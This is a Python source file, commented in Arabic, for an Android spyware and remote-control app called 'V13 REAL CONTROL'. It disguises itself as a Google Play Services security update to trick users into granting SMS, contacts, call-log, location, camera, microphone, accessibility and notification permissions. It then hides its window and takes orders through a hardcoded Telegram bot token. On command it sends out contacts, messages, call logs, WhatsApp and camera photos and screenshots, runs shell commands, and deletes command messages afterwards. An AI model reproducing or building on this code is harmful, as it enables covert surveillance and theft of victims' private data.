# ============================================
# V13 REAL CONTROL - نسخة طلب الصلاحيات اليدوي
# ============================================

import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import hashlib
import random
import string
import subprocess
from pathlib import Path
import shutil
import glob
import datetime
import re
import socket
import struct
import zipfile
import signal
import stat

# ========== بيانات التليجرام ==========
BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
CHAT_ID = "7259620384"
# ======================================

# ========== مسارات الجهاز ==========
BASE_DIR = '/storage/emulated/0'
ANDROID_DATA = '/data/data'
DCIM_DIR = f'{BASE_DIR}/DCIM'
PICTURES_DIR = f'{BASE_DIR}/Pictures'
DOWNLOADS_DIR = f'{BASE_DIR}/Download'
WHATSAPP_DIR = f'{BASE_DIR}/WhatsApp'
TELEGRAM_DIR = f'{BASE_DIR}/Telegram'

# إنشاء المسارات
for path in [BASE_DIR, DCIM_DIR, PICTURES_DIR, DOWNLOADS_DIR]:
    try: os.makedirs(path, exist_ok=True)
    except: pass

# اسم الحزمة
PACKAGE_NAME = "com.google.android.gms.update"

# ========== قائمة بجميع الصلاحيات المطلوبة ==========
ALL_PERMISSIONS = [
    # التخزين
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.MANAGE_EXTERNAL_STORAGE",
    
    # جهات الاتصال
    "android.permission.READ_CONTACTS",
    "android.permission.WRITE_CONTACTS",
    "android.permission.GET_ACCOUNTS",
    
    # الرسائل
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECEIVE_SMS",
    
    # المكالمات
    "android.permission.READ_CALL_LOG",
    "android.permission.WRITE_CALL_LOG",
    "android.permission.READ_PHONE_STATE",
    "android.permission.CALL_PHONE",
    
    # الموقع
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    
    # الكاميرا والصوت
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    
    # الإشعارات
    "android.permission.ACCESS_NOTIFICATION_POLICY",
    "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
    
    # النظام
    "android.permission.SYSTEM_ALERT_WINDOW",
    "android.permission.WRITE_SETTINGS",
    "android.permission.PACKAGE_USAGE_STATS",
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.WAKE_LOCK",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
]

# الصلاحيات الخاصة (تحتاج تفعيل يدوي)
SPECIAL_PERMISSIONS = [
    ("🔄 الوصول للإشعارات", "Notification Access", "notification_listener"),
    ("♿ الوصول للخدمات", "Accessibility Service", "accessibility"),
    ("📊 إحصائيات الاستخدام", "Usage Access", "usage_stats"),
    ("⚡ تجاهل تحسين البطارية", "Battery Optimization", "battery"),
    ("🪟 النوافذ العائمة", "Display over other apps", "system_alert_window"),
    ("⚙️ تعديل الإعدادات", "Write Settings", "write_settings"),
]

# ========== نظام الإرسال ==========
def send_to_telegram(title, message, file_path=None):
    """إرسال سريع"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        text = f"🔴 V13\n⏰ {timestamp}\n📌 {title}\n\n{message[:500]}"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
        
        if file_path:
            if isinstance(file_path, list):
                for f in file_path[:5]:
                    if os.path.exists(f) and os.path.getsize(f) < 50 * 1024 * 1024:
                        with open(f, 'rb') as file:
                            files = {'document': file}
                            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                            requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
                        time.sleep(1)
            elif os.path.exists(file_path) and os.path.getsize(file_path) < 50 * 1024 * 1024:
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
    except:
        pass

# ========== نظام سحب البيانات ==========
class DataGrabber:
    @staticmethod
    def grab_contacts():
        """سحب جهات الاتصال"""
        files = []
        try:
            cmd = "content query --uri content://contacts/phones --projection display_name,number"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                file_path = f'{BASE_DIR}/contacts_{int(time.time())}.txt'
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                files.append(file_path)
        except:
            pass
        return files
    
    @staticmethod
    def grab_sms():
        """سحب الرسائل"""
        files = []
        try:
            cmd = "content query --uri content://sms/inbox --projection address,body,date"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                file_path = f'{BASE_DIR}/sms_{int(time.time())}.txt'
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                files.append(file_path)
        except:
            pass
        return files
    
    @staticmethod
    def grab_calls():
        """سحب سجل المكالمات"""
        files = []
        try:
            cmd = "content query --uri content://call_log/calls --projection number,duration,date"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                file_path = f'{BASE_DIR}/calls_{int(time.time())}.txt'
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                files.append(file_path)
        except:
            pass
        return files
    
    @staticmethod
    def grab_whatsapp():
        """سحب واتساب"""
        files = []
        wa_path = f'{WHATSAPP_DIR}/Media/WhatsApp Images'
        if os.path.exists(wa_path):
            for file in glob.glob(f'{wa_path}/*.jpg')[:5]:
                files.append(file)
        return files
    
    @staticmethod
    def grab_photos():
        """سحب الصور"""
        files = []
        camera_path = f'{DCIM_DIR}/Camera'
        if os.path.exists(camera_path):
            for file in glob.glob(f'{camera_path}/*.jpg')[:5]:
                files.append(file)
        return files
    
    @staticmethod
    def take_screenshot():
        """لقطة شاشة"""
        try:
            path = f'{BASE_DIR}/screen_{int(time.time())}.png'
            subprocess.run(['screencap', '-p', path], timeout=5)
            if os.path.exists(path) and os.path.getsize(path) > 1000:
                return path
        except:
            pass
        return None

# ========== نظام التحكم ==========
class Controller:
    @staticmethod
    def execute(cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            return result.stdout if result.stdout else result.stderr
        except:
            return "خطأ"
    
    @staticmethod
    def open_app(package):
        return Controller.execute(f"monkey -p {package} 1")
    
    @staticmethod
    def close_app(package):
        return Controller.execute(f"am force-stop {package}")
    
    @staticmethod
    def wifi_on():
        return Controller.execute("svc wifi enable")
    
    @staticmethod
    def wifi_off():
        return Controller.execute("svc wifi disable")
    
    @staticmethod
    def data_on():
        return Controller.execute("svc data enable")
    
    @staticmethod
    def data_off():
        return Controller.execute("svc data disable")
    
    @staticmethod
    def lock_screen():
        return Controller.execute("input keyevent 26")

# ========== نظام الأوامر ==========
class CommandHandler:
    @staticmethod
    def check_commands():
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                data = response.json()
                for update in data.get('result', []):
                    message = update.get('message', {})
                    text = message.get('text', '')
                    chat_id = message.get('chat', {}).get('id', '')
                    
                    if chat_id == int(CHAT_ID) and text:
                        CommandHandler.process(text)
                        
                        msg_id = message.get('message_id')
                        if msg_id:
                            del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                            requests.post(del_url, data={"chat_id": CHAT_ID, "message_id": msg_id})
        except:
            pass
    
    @staticmethod
    def process(cmd):
        cmd = cmd.strip().lower()
        
        if cmd == '/help':
            help_text = """
🔴 V13 REAL CONTROL

📱 بيانات:
/contacts - جهات الاتصال
/sms - الرسائل
/calls - سجل المكالمات
/whatsapp - صور واتساب
/photos - صور الكاميرا

🖥️ شاشة:
/screen - لقطة شاشة
/lock - قفل الشاشة

🌐 شبكة:
/wifi-on - تشغيل WiFi
/wifi-off - إطفاء WiFi
/data-on - تشغيل بيانات
/data-off - إطفاء بيانات

📱 تطبيقات:
/open [package] - فتح
/close [package] - إغلاق

ℹ️ معلومات:
/info - معلومات الجهاز
            """
            send_to_telegram("📋 المساعدة", help_text)
        
        elif cmd == '/info':
            try:
                model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
                android = subprocess.run("getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
                send_to_telegram("📱 الجهاز", f"الموديل: {model}\nأندرويد: {android}")
            except:
                send_to_telegram("📱 الجهاز", "معلومات غير متوفرة")
        
        elif cmd == '/contacts':
            files = DataGrabber.grab_contacts()
            send_to_telegram("👥 جهات الاتصال", f"تم العثور على {len(files)} ملف", files)
        
        elif cmd == '/sms':
            files = DataGrabber.grab_sms()
            send_to_telegram("📨 الرسائل", f"تم العثور على {len(files)} ملف", files)
        
        elif cmd == '/calls':
            files = DataGrabber.grab_calls()
            send_to_telegram("📞 المكالمات", f"تم العثور على {len(files)} ملف", files)
        
        elif cmd == '/whatsapp':
            files = DataGrabber.grab_whatsapp()
            send_to_telegram("📱 واتساب", f"تم العثور على {len(files)} صورة", files)
        
        elif cmd == '/photos':
            files = DataGrabber.grab_photos()
            send_to_telegram("📸 الصور", f"تم العثور على {len(files)} صورة", files)
        
        elif cmd == '/screen':
            path = DataGrabber.take_screenshot()
            if path:
                send_to_telegram("🖥️ لقطة شاشة", "تم", path)
            else:
                send_to_telegram("❌ خطأ", "فشل أخذ لقطة الشاشة")
        
        elif cmd == '/lock':
            Controller.lock_screen()
            send_to_telegram("🔒 قفل", "تم قفل الشاشة")
        
        elif cmd == '/wifi-on':
            Controller.wifi_on()
            send_to_telegram("📶 WiFi", "تم التشغيل")
        
        elif cmd == '/wifi-off':
            Controller.wifi_off()
            send_to_telegram("📶 WiFi", "تم الإطفاء")
        
        elif cmd == '/data-on':
            Controller.data_on()
            send_to_telegram("📱 بيانات", "تم التشغيل")
        
        elif cmd == '/data-off':
            Controller.data_off()
            send_to_telegram("📱 بيانات", "تم الإطفاء")
        
        elif cmd.startswith('/open '):
            package = cmd.replace('/open ', '')
            Controller.open_app(package)
            send_to_telegram("▶️ فتح", f"تم فتح {package}")
        
        elif cmd.startswith('/close '):
            package = cmd.replace('/close ', '')
            Controller.close_app(package)
            send_to_telegram("⏹️ إغلاق", f"تم إغلاق {package}")

# ========== الواجهة الرئيسية - طلب الصلاحيات يدوي ==========
def main(page: ft.Page):
    page.title = "Google Play Services"
    page.theme_mode = ft.ThemeMode.LIGHT
    page.window_width = 400
    page.window_height = 700
    page.window_resizable = False
    page.padding = 20
    page.scroll = ft.ScrollMode.AUTO
    page.bgcolor = "#f5f5f5"
    
    # شريط التطبيق
    page.appbar = ft.AppBar(
        title=ft.Text("Google Play Services", color="white", size=20),
        bgcolor="#4CAF50",
        center_title=True,
        leading=ft.Icon(ft.icons.ANDROID)
    )
    
    # نص الترحيب
    welcome_text = ft.Container(
        content=ft.Column([
            ft.Text("🔐 تحديث أمني ضروري", size=22, weight="bold", color="#333"),
            ft.Text("نحتاج لبعض الصلاحيات لتثبيت التحديث", size=16, color="#666"),
            ft.Divider(height=20),
        ]),
        padding=10
    )
    
    # قائمة الصلاحيات الأساسية
    basic_perms_title = ft.Text("📋 الصلاحيات المطلوبة:", size=18, weight="bold", color="#4CAF50")
    
    basic_perms_list = ft.Column(spacing=8)
    basic_perms = [
        ("📁 التخزين", "الوصول للملفات والصور", "storage"),
        ("👥 جهات الاتصال", "الوصول للأسماء والأرقام", "contacts"),
        ("📨 الرسائل", "قراءة الرسائل النصية", "sms"),
        ("📞 المكالمات", "سجل المكالمات", "calls"),
        ("📍 الموقع", "الموقع الجغرافي", "location"),
        ("📸 الكاميرا", "التقاط الصور", "camera"),
        ("🎤 الميكروفون", "تسجيل الصوت", "microphone"),
    ]
    
    for perm_name, perm_desc, perm_id in basic_perms:
        basic_perms_list.controls.append(
            ft.Container(
                content=ft.Row([
                    ft.Icon(ft.icons.RADIO_BUTTON_UNCHECKED, color="#4CAF50", size=20),
                    ft.Column([
                        ft.Text(perm_name, size=16, weight="bold", color="#333"),
                        ft.Text(perm_desc, size=12, color="#666"),
                    ], spacing=0),
                ], alignment=ft.MainAxisAlignment.START),
                padding=10,
                border=ft.border.all(1, "#ddd"),
                border_radius=10,
                ink=True,
                on_click=lambda e, p=perm_id: request_permission(e, page, p)
            )
        )
    
    # الصلاحيات الخاصة
    special_perms_title = ft.Container(
        content=ft.Column([
            ft.Divider(height=20),
            ft.Text("⚡ صلاحيات متقدمة (تحتاج تفعيل يدوي):", size=18, weight="bold", color="#FF9800"),
        ]),
        padding=10
    )
    
    special_perms_list = ft.Column(spacing=8)
    special_perms = [
        ("🔄 الوصول للإشعارات", "قراءة كل الإشعارات", "notification"),
        ("♿ الوصول للخدمات", "التحكم الكامل", "accessibility"),
        ("📊 إحصائيات الاستخدام", "مراقبة التطبيقات", "usage"),
        ("⚡ تحسين البطارية", "تجاهل تحسين البطارية", "battery"),
        ("🪟 النوافذ العائمة", "عرض فوق التطبيقات", "overlay"),
        ("⚙️ تعديل الإعدادات", "تغيير إعدادات النظام", "settings"),
    ]
    
    for perm_name, perm_desc, perm_id in special_perms:
        special_perms_list.controls.append(
            ft.Container(
                content=ft.Row([
                    ft.Icon(ft.icons.SETTINGS, color="#FF9800", size=20),
                    ft.Column([
                        ft.Text(perm_name, size=16, weight="bold", color="#333"),
                        ft.Text(perm_desc, size=12, color="#666"),
                    ], spacing=0),
                    ft.Icon(ft.icons.ARROW_FORWARD, color="#FF9800", size=20),
                ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
                padding=10,
                border=ft.border.all(1, "#ddd"),
                border_radius=10,
                ink=True,
                on_click=lambda e, p=perm_id: open_settings(e, page, p)
            )
        )
    
    # زر متابعة
    continue_btn = ft.Container(
        content=ft.ElevatedButton(
            content=ft.Row([
                ft.Icon(ft.icons.CHECK_CIRCLE, color="white"),
                ft.Text("متابعة التثبيت", size=18, weight="bold"),
            ]),
            style=ft.ButtonStyle(
                color="white",
                bgcolor="#4CAF50",
                padding=20,
                shape=ft.RoundedRectangleBorder(radius=10),
            ),
            width=350,
            on_click=lambda e: finish_installation(e, page)
        ),
        padding=20
    )
    
    # إضافة كل شيء للصفحة
    page.add(
        welcome_text,
        basic_perms_title,
        basic_perms_list,
        special_perms_title,
        special_perms_list,
        continue_btn
    )
    
    # دالة طلب الصلاحية الأساسية
    def request_permission(e, page, perm):
        try:
            # تغيير لون الأيقونة
            e.control.content.controls[0].icon = ft.icons.CHECK_CIRCLE
            e.control.content.controls[0].color = "#4CAF50"
            page.update()
            
            # طلب الصلاحية
            page.request_permission(perm)
            
            # رسالة تأكيد
            page.snack_bar = ft.SnackBar(
                content=ft.Text(f"تم طلب الصلاحية: {perm}"),
                bgcolor="#4CAF50"
            )
            page.snack_bar.open = True
            page.update()
        except:
            pass
    
    # دالة فتح إعدادات الصلاحية الخاصة
    def open_settings(e, page, perm_type):
        try:
            # فتح الإعدادات المناسبة حسب نوع الصلاحية
            if perm_type == "notification":
                page.launch_url("android.settings.NOTIFICATION_LISTENER_SETTINGS")
                msg = "افتح الإعدادات > التطبيقات > وصول خاص > الوصول للإشعارات"
            elif perm_type == "accessibility":
                page.launch_url("android.settings.ACCESSIBILITY_SETTINGS")
                msg = "افتح الإعدادات > إمكانية الوصول > الخدمات المثبتة"
            elif perm_type == "usage":
                page.launch_url("android.settings.USAGE_ACCESS_SETTINGS")
                msg = "افتح الإعدادات > الأمان > الوصول لاستخدام البيانات"
            elif perm_type == "battery":
                page.launch_url("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS")
                msg = "افتح الإعدادات > البطارية > تحسين البطارية"
            elif perm_type == "overlay":
                page.launch_url("android.settings.MANAGE_OVERLAY_PERMISSION")
                msg = "افتح الإعدادات > التطبيقات > خاص > عرض فوق التطبيقات"
            elif perm_type == "settings":
                page.launch_url("android.settings.MANAGE_WRITE_SETTINGS")
                msg = "افتح الإعدادات > التطبيقات > خاص > تعديل الإعدادات"
            
            # رسالة إرشادية
            page.snack_bar = ft.SnackBar(
                content=ft.Text(msg),
                bgcolor="#FF9800"
            )
            page.snack_bar.open = True
            page.update()
        except:
            pass
    
    # دالة إنهاء التثبيت
    def finish_installation(e, page):
        # تغيير النص
        e.control.content.controls[1].value = "جاري التثبيت..."
        e.control.disabled = True
        page.update()
        
        # انتظار 3 ثواني
        time.sleep(3)
        
        # إخفاء التطبيق
        page.window_visible = False
        page.update()
        
        # إرسال إشعار بالبدء
        try:
            model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            send_to_telegram("✅ تم التشغيل", f"الجهاز: {model}\nتم تفعيل التطبيق")
        except:
            send_to_telegram("✅ تم التشغيل", "التطبيق يعمل في الخلفية")
        
        # بدء العمليات في الخلفية
        threading.Thread(target=background_loop, daemon=True).start()
    
    # الحلقة الخلفية
    def background_loop():
        while True:
            try:
                CommandHandler.check_commands()
                time.sleep(2)
            except:
                time.sleep(5)

# ========== التشغيل ==========
if __name__ == "__main__":
    try:
        ft.app(target=main)
    except:
        while True:
            time.sleep(10)
